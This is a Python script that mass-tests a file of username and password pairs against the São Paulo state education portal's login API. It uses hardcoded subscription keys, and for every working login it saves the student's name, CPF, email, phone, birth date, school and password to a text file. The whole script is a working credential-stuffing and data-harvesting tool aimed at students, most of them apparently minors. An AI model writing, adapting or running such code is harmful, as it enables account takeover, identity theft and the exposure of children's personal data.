import requests
import re
from datetime import datetime

# Endpoints
LOGIN_URL = "https://sedintegracoes.educacao.sp.gov.br/credenciais/api/LoginCompletoToken"
TURMA_URL = "https://sedintegracoes.educacao.sp.gov.br/apihubintegracoes/api/v2/Turma/ListarTurmasPorAluno?codigoAluno={codigo_aluno}"

# Headers
LOGIN_HEADERS = {
    "Ocp-Apim-Subscription-Key": "2b03c1db3884488795f79c37c069381a",
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Origin": "https://saladofuturo.educacao.sp.gov.br",
    "Referer": "https://saladofuturo.educacao.sp.gov.br/"
}

TURMA_HEADERS = {
    "Ocp-Apim-Subscription-Key": "5936fddda3484fe1aa4436df1bd76dab",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Origin": "https://saladofuturo.educacao.sp.gov.br",
    "Referer": "https://saladofuturo.educacao.sp.gov.br/"
}

def login(ra, senha):
    payload = {"user": ra, "senha": senha}
    try:
        resp = requests.post(LOGIN_URL, headers=LOGIN_HEADERS, json=payload, timeout=15)
        if resp.status_code == 200:
            return resp.json()
        return None
    except requests.RequestException:
        return None

def processar_login(ra, senha):
    dados = login(ra, senha)
    if not dados or "DadosUsuario" not in dados:
        return {"status": "erro", "ra": ra, "mensagem": "Login incorreto"}

    usuario = dados["DadosUsuario"]

    nome = usuario.get("NAME", "N/A")
    cpf = usuario.get("NR_CPF", "N/A")
    email = usuario.get("EMAIL", "N/A")
    nascimento = usuario.get("A", [{}])[0].get("DT_NASC", "N/A")[:10]
    telefone = usuario.get("A", [{}])[0].get("NR_TELEFONE", "N/A")
    cd_usuario = str(usuario.get("CD_USUARIO", ""))
    codigo_aluno = cd_usuario[:-1] if cd_usuario else None

    idade = "N/A"
    if nascimento != "N/A":
        try:
            nasc_date = datetime.strptime(nascimento, "%Y-%m-%d")
            hoje = datetime.today()
            idade = hoje.year - nasc_date.year - ((hoje.month, hoje.day) < (nasc_date.month, nasc_date.day))
        except Exception:
            pass

    print("\n===== DADOS DO ALUNO =====")
    print(f"Nome: {nome}")
    print(f"Data de nascimento: {nascimento} (Idade: {idade} anos)")
    print(f"CPF: {cpf}")
    print(f"E-mail: {email}")
    print(f"Telefone: {telefone}")

    # Buscar turma/escola
    escola, ensino, serie = listar_turma(codigo_aluno, dados["token"])

    return {
        "status": "ok",
        "ra": ra,
        "senha": senha,
        "nome": nome,
        "cpf": cpf,
        "email": email,
        "nascimento": nascimento,
        "telefone": telefone,
        "escola": escola,
        "ensino": ensino,
        "serie": serie,
    }

def listar_turma(codigo_aluno, token):
    if not codigo_aluno:
        return "N/A", "N/A", "N/A"

    url = TURMA_URL.format(codigo_aluno=codigo_aluno)
    headers = TURMA_HEADERS.copy()
    headers["Authorization"] = f"Bearer {token}"

    try:
        resp = requests.get(url, headers=headers, timeout=15)
        resp.raise_for_status()
        turmas = resp.json().get("data", [])
        if turmas:
            turma = turmas[0]  # primeira turma encontrada
            escola = turma.get("NomeEscola", "N/A")
            ensino = turma.get("NomeTipoEnsino", "N/A")
            serie = turma.get("NumeroSerie", "N/A")
            print("\n===== TURMA E ESCOLA =====")
            print(f"Escola: {escola}")
            print(f"Ensino: {ensino}")
            print(f"Série: {serie}ª")
            return escola, ensino, serie
    except Exception as e:
        print(f"Erro ao consultar turma: {e}")

    return "N/A", "N/A", "N/A"

def ler_usuarios(arquivo):
    usuarios = []
    with open(arquivo, "r", encoding="utf-8") as f:
        conteudo = f.read()

    blocos = conteudo.strip().split("\n\n")
    for bloco in blocos:
        user_match = re.search(r"User:\s*(\d+)", bloco)
        pass_match = re.search(r"Pass:\s*(.+)", bloco)
        if user_match and pass_match:
            ra = user_match.group(1).lstrip("0") + "sp"  # tira zeros e adiciona 'sp'
            senha = pass_match.group(1).strip()
            usuarios.append((ra, senha))
    return usuarios

def salvar_login_valido(dados, arquivo="logins_validos.txt"):
    with open(arquivo, "a", encoding="utf-8") as f:
        f.write("========================================\n")
        f.write("            CADASTRO DO USUÁRIO\n")
        f.write("========================================\n\n")

        f.write("[INFORMAÇÕES PESSOAIS]\n")
        f.write(f"Nome Completo: {dados['nome']}\n")
        f.write(f"CPF: {dados['cpf']}\n")
        f.write(f"E-mail: {dados['email']}\n")
        f.write(f"Usuário (RA): {dados['ra']}\n")
        f.write(f"Senha: {dados['senha']}\n\n")

        f.write("[INFORMAÇÕES ESCOLARES]\n")
        f.write(f"Escola: {dados['escola']}\n")
        f.write(f"Tipo de Ensino: {dados['ensino']}\n")
        f.write(f"Série: {dados['serie']}º Ano\n\n")

        f.write("========================================\n\n")

def main():
    caminho = input("Digite o caminho do arquivo txt com os logins: ").strip()
    usuarios = ler_usuarios(caminho)

    for ra, senha in usuarios:
        print(f"\n🔄 Testando login RA: {ra} ...")
        resultado = processar_login(ra, senha)

        if resultado["status"] == "ok":
            print("✅ Login válido e salvo!")
            salvar_login_valido(resultado)
        else:
            print(f"❌ Erro: {resultado['mensagem']}")

if __name__ == "__main__":
    main()

